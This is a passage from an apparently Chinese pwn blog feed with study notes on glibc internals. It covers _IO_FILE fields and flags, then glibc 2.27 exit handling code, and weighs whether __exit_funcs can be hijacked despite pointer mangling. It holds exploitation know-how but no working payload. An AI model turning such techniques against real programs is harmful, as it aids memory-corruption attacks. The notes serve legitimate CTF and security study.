class="comment">//标志表示流对象使用了文件缓冲，这意味着它与底层文件描述符相关联，可以用于标准文件操作，如读取和写入文件。</span></span></span><br><span class="line">                           <span class="comment">/* 0x4000  No longer used, reserved for compat.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_LOCK         0x8000<span class="comment">//表示用户已经为文件流提供了自定义的锁</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLOSED_FILEBUF_FLAGS (_IO_IS_FILEBUF+_IO_NO_READS+_IO_NO_WRITES+_IO_TIED_PUT_GET)</span></span><br><span class="line">Expands to:</span><br><span class="line">(<span class="number">0x2000</span>+<span class="number">0x0004</span>+<span class="number">0x0008</span>+<span class="number">0x0400</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Bits for the _flags2 field.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_MMAP 1  <span class="comment">//文件流支持使用内存映射进行I/O操作</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_NOTCANCEL 2<span class="comment">//表示文件流的操作不会被取消，即使在多线程或异步环境下发生了取消操作。这可以用于确保某些文件操作不会被中断或取消，以避免不一致的状态。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_USER_WBUF 8<span class="comment">//文件流不使用标准C库的内部缓冲区，而是依赖于用户提供的缓冲区来进行写入操作</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_NOCLOSE 32<span class="comment">//关闭文件流时不关闭底层文件描述符，从而允许在文件描述符上进行进一步的操作。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_CLOEXEC 64<span class="comment">//文件流在执行exec系统调用时关闭文件描述符,确保在执行新程序时不会继续继承文件描述符。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_NEED_LOCK 128<span class="comment">//表示文件流需要互斥锁mutex来确保多线程环境下的安全访问</span></span></span><br></pre></td></tr></table></figure><p>全缓冲没有专有的标志位,当行缓冲和无缓冲标志位皆为0时一般是全缓冲状态</p><h2 id="read和write"><a href="#read和write" class="headerlink" title="read和write"></a>read和write</h2><p>read和write这两个系统调用一般<strong>不经过用户缓冲区</strong><br>与_IO<em>FILE结构(_IO_2_1_stdin\</em>,_IO<em>2_1_stdout</em>)也没什么交集</p><p>亦不受行缓冲全缓冲这些限制</p><p>当执行read(0,dest,size)时,发送长度为len的数据</p><ol><li>若len小于等于size,read读入len长度的数据</li><li>若len大于size,则read只读入size长度的数据,并将多余的len-size长度数据留待下一次read调用</li></ol><p>当执行write(1,dest,size)时</p><p>一般情况无论如何都会写出size长度内容</p><h2 id="读缓冲区和写缓冲区的操作差异"><a href="#读缓冲区和写缓冲区的操作差异" class="headerlink" title="读缓冲区和写缓冲区的操作差异"></a>读缓冲区和写缓冲区的操作差异</h2><p>与缓冲模式关联较大,以全缓冲为例</p><p>不过缓冲区模式对写的影响要比对读的影响要更大</p><h3 id="读缓冲区"><a href="#读缓冲区" class="headerlink" title="读缓冲区"></a>读缓冲区</h3><ol><li><code>_IO_read_base</code>：这是指向输入缓冲区的起始位置的指针。输入缓冲区是一个内存区域，用于存储从文件中读取的数据。初始时，<code>_IO_read_base</code> 指向输入缓冲区的起始位置。</li><li><code>_IO_read_ptr</code>：这是指向下一个待读取的文件数据的位置的指针。在开始读取数据时，<code>_IO_read_ptr</code> 指向 <code>_IO_read_base</code>，然后随着数据的读取逐渐向后移动。当数据从文件流中读取时，<code>_IO_read_ptr</code> 向后移动，指向下一个可以读取的位置。</li><li><code>_IO_read_end</code>：这是指向输入缓冲区的末尾位置的指针。当 <code>_IO_read_ptr</code> 到达 <code>_IO_read_end</code> 时，表示输入缓冲区已空，没有更多数据可供读取。此时，可能会触发重新填充输入缓冲区的操作。</li></ol><h3 id="写缓冲区"><a href="#写缓冲区" class="headerlink" title="写缓冲区"></a>写缓冲区</h3><ol><li><code>_IO_write_base</code>：这是指向输出缓冲区的起始位置的指针。输出缓冲区是一个内存区域，用于存储待写入文件的数据。初始时，<code>_IO_write_base</code> 指向输出缓冲区的起始位置。</li><li><code>_IO_write_ptr</code>：这是指向下一个待写入文件的数据的位置的指针。在开始写入数据时，<code>_IO_write_ptr</code> 指向 <code>_IO_write_base</code>，然后随着数据的写入逐渐向后移动。当数据写入输出缓冲区时，<code>_IO_write_ptr</code> 向后移动，指向下一个可以写入的位置。</li><li><code>_IO_write_end</code>：这是指向输出缓冲区的末尾位置的指针。当 <code>_IO_write_ptr</code> 到达 <code>_IO_write_end</code> 时，表示输出缓冲区已满。这通常触发缓冲区的刷新操作，将缓冲区中的数据写入文件，并重新设置 <code>_IO_write_ptr</code> 到 <code>_IO_write_base</code>，以准备接受更多的数据。</li></ol><h2 id="IO-FILE一些字段解释"><a href="#IO-FILE一些字段解释" class="headerlink" title="_IO_FILE一些字段解释"></a>_IO_FILE一些字段解释</h2><h3 id="offset"><a href="#offset" class="headerlink" title="_offset"></a>_offset</h3><p><code>IO_FILE</code> 结构的 <code>_offset</code> 字段是用于文件定位的，它指示文件流的当前位置或偏移量。这个字段记录了文件流当前的读写位置，以便在读写文件时进行定位和管理。它的主要作用包括：</p><ol><li><p>文件定位：<code>_offset</code> 字段指示文件流中当前的读写位置。在读取或写入文件时，它用于确定从文件的哪个位置开始读取或写入数据。</p></li><li><p>文件指针的移动：<code>fseek</code> 和 <code>fsetpos</code> 等函数可用于显式地更改文件流的 <code>_offset</code> 字段，以将文件指针移动到指定的位置。</p></li><li><p>文件读写的相对位置： <code>_offset</code> 字段允许程序知道文件流在读取或写入时相对于文件开头的位置，这对于文件的随机访问非常有用。</p></li><li><p>文件尾标记： <code>_offset</code> 字段还用于跟踪文件流是否已经达到文件的末尾。当 <code>_offset</code> 达到文件的末尾时，进一步的读取操作将返回文件结束标记（EOF）。</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* _IO_pos_BAD is an off64_t value indicating error, unknown, or EOF.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_pos_BAD ((off64_t) -1)<span class="comment">//文件末尾</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* _IO_pos_adjust adjusts an off64_t by some number of bytes.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_pos_adjust(pos, delta) ((pos) += (delta))<span class="comment">//文件中间某位置</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* _IO_pos_0 is an off64_t value indicating beginning of file.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_pos_0 ((off64_t) 0)<span class="comment">//文件起始</span></span></span><br></pre></td></tr></table></figure><p>这个字段十分重要,</p><p><strong>每一次文件流读写操作的基址都由其决定</strong>,fread,fwrite等函数操作完成后都会将_offse后移</p><p>为了准确的定位_offset</p><p><strong>读写时会有各种操作平衡读写一致</strong></p><h3 id="cur-column"><a href="#cur-column" class="headerlink" title="_cur_column"></a>_cur_column</h3><p><code>_cur_column</code> 是 <code>IO_FILE</code> 结构中的字段，用于跟踪文件流的当前列位置（column position）。这个字段通常用于文本文件的处理，以记录最后一个字符写入或读取的列位置。具体作用如下：</p><ol><li><p>列位置跟踪：<code>_cur_column</code> 字段记录文件流中当前字符的列位置。在文本文件中，这可以表示当前字符在行中的偏移量，以便进行格式化或对齐文本。</p></li><li><p>文本格式化：在文本文件的读写过程中，<code>_cur_column</code> 字段可以用于确保文本数据按列或字段正确对齐。例如，它可用于在写入文本数据时进行缩进或对齐，以确保文本格式的一致性。</p></li><li><p>读取和写入的参考点：<code>_cur_column</code> 字段可以作为读取或写入的参考点，以确定下一个字符的列位置。这对于编写自定义文本处理代码非常有用，例如，在解析CSV文件或生成格式化的文本输出时。</p></li></ol><h3 id="save"><a href="#save" class="headerlink" title="save"></a>save</h3><p><code>_IO_FILE</code> 是在C标准库中用于文件输入/输出的数据结构，通常被简称为 <code>FILE</code> 结构。在 <code>FILE</code> 结构中，<code>_IO_save_base</code>、<code>_IO_backup_base</code> 和 <code>_IO_save_end</code> 是用于实现缓冲的字段，它们用于高效地管理文件数据的读取和写入。下面是它们的作用：</p><ol><li><code>_IO_save_base</code>：<ul><li><code>_IO_save_base</code> 是一个指向缓冲区的指针，它指向了当前输入/输出操作的起始位置。</li><li>当你进行文件读取操作时，<code>_IO_save_base</code> 会指向文件数据的起始位置。</li><li>在某些情况下，例如当需要执行回退（unget）操作时，它用于保存当前位置，以便后续可以恢复到之前的位置。</li></ul></li><li><code>_IO_backup_base</code>：<ul><li><code>_IO_backup_base</code> 是另一个指向缓冲区的指针，它指向上一个 <code>_IO_save_base</code> 的位置。</li><li>通常，当进行某些文件操作，如 <code>fseek</code> 或 <code>fsetpos</code>，需要保存当前位置和状态，以便之后可以恢复到之前的状态。<code>_IO_backup_base</code> 用于保存这些状态信息。</li></ul></li><li><code>_IO_save_end</code>：<ul><li><code>_IO_save_end</code> 是一个指向缓冲区的指针，它指向当前输入/输出操作的结束位置。</li><li>在文件写入操作中，<code>_IO_save_end</code> 指示了数据写入的结束位置。</li><li>在文件读取操作中，<code>_IO_save_end</code> 可能会被用于确定何时需要重新填充缓冲区。</li></ul></li></ol><h3 id="marker"><a href="#marker" class="headerlink" title="marker"></a>marker</h3><p>用于支持文件流缓冲的定位的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">next</span>;</span></span><br><span class="line">  FILE *_sbuf;</span><br><span class="line">  <span class="comment">/* If _pos &gt;= 0</span></span><br><span class="line"><span class="comment"> it points to _buf-&gt;Gbase()+_pos. FIXME comment */</span></span><br><span class="line">  <span class="comment">/* if _pos &lt; 0, it points to _buf-&gt;eBptr()+_pos. FIXME comment */</span></span><br><span class="line">  <span class="type">int</span> _pos;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="mode"><a href="#mode" class="headerlink" title="_mode"></a>_mode</h3><p>正常情况下取值有三种情况:</p><ol><li>负数,一般为-1</li><li>0</li><li>正数,一般为1</li></ol><p>其中前两者都是窄字符模式,后者是宽字符模式</p><p>虽然理论上1和3两种情况可能有很多取值,但某些特殊情况下(例如puts,printf的stdout初始检测中),只将0和-1判定为窄字符模式,剩下的都代表宽字符模式</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IO_FILE </tag>
            
            <tag> 学习记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>exit函数利用</title>
      <link href="/posts/11890/"/>
      <url>/posts/11890/</url>
      
        <content type="html"><![CDATA[<h1 id="源码2-27"><a href="#源码2-27" class="headerlink" title="源码2.27"></a>源码2.27</h1><p>先看两个exit.h中的重要结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* `flavour&#x27; should be of type of the `enum&#x27; above but since we need</span></span><br><span class="line"><span class="comment">       this element in an atomic operation we have to use `long int&#x27;.  */</span></span><br><span class="line">    <span class="type">long</span> <span class="type">int</span> flavor;</span><br><span class="line">    <span class="comment">/*函数类型, 可以是&#123;ef_free, ef_us, ef_on, ef_at, ef_cxa&#125;</span></span><br><span class="line"><span class="comment">       - ef_free表示此位置空闲</span></span><br><span class="line"><span class="comment">       - ef_us表示此位置被使用中, 但是函数类型不知道</span></span><br><span class="line"><span class="comment">       - ef_on, ef_at, ef_cxa 分别对应三种不同的析构函数类型, 主要是参数上的差异*/</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span>         //一个联合体<span class="title">func</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line"><span class="type">void</span> (*at) (<span class="type">void</span>);   <span class="comment">//ef_at类型 没有参数</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">void</span> (*fn) (<span class="type">int</span> status, <span class="type">void</span> *arg);   <span class="comment">//ef_on类型</span></span><br><span class="line">    <span class="type">void</span> *arg;</span><br><span class="line">  &#125; on;</span><br><span class="line"><span class="class"><span class="keyword">struct</span>    </span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">void</span> (*fn) (<span class="type">void</span> *arg, <span class="type">int</span> status); <span class="comment">//ef_cxa类型</span></span><br><span class="line">    <span class="type">void</span> *arg;</span><br><span class="line">    <span class="type">void</span> *dso_handle;</span><br><span class="line">  &#125; cxa;</span><br><span class="line">      &#125; func;</span><br><span class="line">  &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">next</span>;</span>  <span class="comment">//下一个exit_function_list,单链表</span></span><br><span class="line">    <span class="type">size_t</span> idx;   <span class="comment">//记录有多少个函数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> <span class="title">fns</span>[32];</span>  <span class="comment">//exit_function数组,析构函数数组</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></p><p>首先是exit的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">exit</span> <span class="params">(<span class="type">int</span> status)</span></span><br><span class="line">&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (<span class="built_in">exit</span>)</span><br></pre></td></tr></table></figure><p>libc经典的套娃函数,可以看出exit的主体是__run_exit_handlers</p><p>run_exit_handlers()的主要工作就是<strong>调用exit_funcs中保存的各种函数指针</strong></p><p>看其工作流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//调用atexit与on_exit注册的函数，顺序为注册的逆序</span></span><br><span class="line"><span class="type">void</span> attribute_hidden __run_exit_handlers(<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp, <span class="type">bool</span> run_list_atexit)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//首先释放线程局部储存, 即TLS</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line"><span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">__call_tls_dtors();</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历exit_fundtion_list链表，链表种每个节点里又有一个函数指针数组，根据里面的函数类型进行调用</span></span><br><span class="line"><span class="keyword">while</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> =</span> *listp; <span class="comment">//cur指向当前exit_function_list节点</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//cur-&gt;idx表示cur-&gt;fns中有多少个函数，从后往前遍历</span></span><br><span class="line"><span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>) <span class="comment">//遍历exit_function_list节点中 析构函数数组fns[32]中的函数指针</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span> &amp;cur-&gt;fns[--cur-&gt;idx]; <span class="comment">//f指向对应析构函数的描述符</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (f-&gt;flavor) <span class="comment">//选择析构函数类型</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//三种函数指针</span></span><br><span class="line">    <span class="type">void</span> (*atfct)(<span class="type">void</span>);</span><br><span class="line">    <span class="type">void</span> (*onfct)(<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">    <span class="type">void</span> (*cxafct)(<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//这两种类型不调用</span></span><br><span class="line">  <span class="keyword">case</span> ef_free:</span><br><span class="line">  <span class="keyword">case</span> ef_us:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//on类型的参数为注册时设定的参数</span></span><br><span class="line">  <span class="keyword">case</span> ef_on:</span><br><span class="line">    onfct = f-&gt;func.on.fn; <span class="comment">//设置函数指针</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">    PTR_DEMANGLE(onfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    onfct(status, f-&gt;func.on.arg); <span class="comment">//调用这个函数指针</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//at没有参数</span></span><br><span class="line">  <span class="keyword">case</span> ef_at:</span><br><span class="line">    atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">    PTR_DEMANGLE(atfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    atfct();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//cxa类型则先为设定时的参数，再为状态码</span></span><br><span class="line">  <span class="keyword">case</span> ef_cxa:</span><br><span class="line">    cxafct = f-&gt;func.cxa.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">    PTR_DEMANGLE(cxafct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    cxafct(f-&gt;func.cxa.arg, status); </span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*listp = cur-&gt;next; <span class="comment">//listp指向下一个exit_function_list节点</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//最后一个链表节点为libc .data段中的initial，不需要释放</span></span><br><span class="line"><span class="comment">//除此以外的节点都是malloc申请得到的, 所以需要释放</span></span><br><span class="line"><span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">  <span class="built_in">free</span>(cur);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (run_list_atexit) <span class="comment">//调用_atexit</span></span><br><span class="line">RUN_HOOK(__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">_exit(status); <span class="comment">//真正的exit系统调用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="思考1-能否劫持-exit-funcs数组"><a href="#思考1-能否劫持-exit-funcs数组" class="headerlink" title="思考1:能否劫持__exit_funcs数组?"></a>思考1:能否劫持__exit_funcs数组?</h2><p>在exit调用<strong>run_exit_handlers()时下断点, 找到</strong>exit_funcs指针</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-04-05_165633.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-04-05_170143.png" alt=""></p><p>可以看到其中最重要的fns[0]被加密成乱码了,要想利用的话还要获得存储在fs:0x30的密钥,难度高,几乎难以利用</p><h2 id="exit-funcs如何添加析构函数"><a href="#exit-funcs如何添加析构函数" class="headerlink" title="__exit_funcs如何添加析构函数()"></a>__exit_funcs如何添加析构函数()</h2><p>既然难以攻击<strong>exit_funcs, 那么尝试从</strong>exit_funcs中的函数入手</p><p>我们首先要弄明白, __exit_funcs中的函数是怎么添加的</p><p>libc提供了一个接口: atexit()用来注册exit()时调用的析构函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* DSO由GCC定义，用来识别模块的*/</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> *__dso_handle __attribute__((__weak__));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 注册一个exit时调用的析构函数*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">atexit</span><span class="params">(<span class="type">void</span> (*func)(<span class="type">void</span>))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> __cxa_atexit((<span class="type">void</span> (*)(<span class="type">void</span> *))func, <span class="literal">NULL</span>, &amp;__dso_handle == <span class="literal">NULL</span> ? <span class="literal">NULL</span> : __dso_handle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cxa_atexit()是对internal_atexit()的封装</p><p>注意: __exit_funcs就是exit()时用的那个指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注册一个exit/共享库被卸载时调用的函数，只会被C++编译器生产的代码调用，C会通过atexit调用</span></span><br><span class="line"><span class="type">int</span> __cxa_atexit(<span class="type">void</span> (*func)(<span class="type">void</span> *), <span class="type">void</span> *arg, <span class="type">void</span> *d)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __internal_atexit(func, arg, d, &amp;__exit_funcs);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def(__cxa_atexit)</span><br></pre></td></tr></table></figure><p><strong>internel_atexit()通过</strong>new_exitfn()找到一个在__exit_funcs链表上注册析构函数的位置, 然后进行写入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  参数:</span></span><br><span class="line"><span class="comment">    - func  析构函数指针</span></span><br><span class="line"><span class="comment">    - arg   参数指针</span></span><br><span class="line"><span class="comment">    - d     DSO</span></span><br><span class="line"><span class="comment">    - listp 析构函数数组链表指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> attribute_hidden __internal_atexit(<span class="type">void</span> (*func)(<span class="type">void</span> *), <span class="type">void</span> *arg, <span class="type">void</span> *d, <span class="keyword">struct</span> exit_function_list **listp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">new</span> =</span> __new_exitfn(listp); <span class="comment">//先在__exit_funcs链表上添加一个描述析构函数的结构体</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_MANGLE</span></span><br><span class="line">  PTR_MANGLE(func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//然后设置分配到的这个结构体</span></span><br><span class="line">  new-&gt;func.cxa.fn = (<span class="type">void</span> (*)(<span class="type">void</span> *, <span class="type">int</span>))func; <span class="comment">//函数指针</span></span><br><span class="line">  new-&gt;func.cxa.arg = arg;                        <span class="comment">//参数</span></span><br><span class="line">  new-&gt;func.cxa.dso_handle = d;</span><br><span class="line">  atomic_write_barrier();</span><br><span class="line">  new-&gt;flavor = ef_cxa;                         <span class="comment">//类型</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__new_exitfn()的逻辑大致为</p><ul><li>先尝试在__exit_funcs中找到一个exit_function类型的ef_free的位置, ef_free代表着此位置空闲</li><li>如果没找到, 就新建一个exit_function节点, 使用头插法插入__exit_funcs链表, 使用新节点的第一个位置作为分配到的exit_function结构体</li><li>设置找到的exit_function的类型为ef_us, 表示正在使用中, 并返回</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//从listp上返回一个新的exit_function结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *__<span class="title">new_exitfn</span>(<span class="keyword">struct</span> <span class="title">exit_function_list</span> **<span class="title">listp</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">p</span> 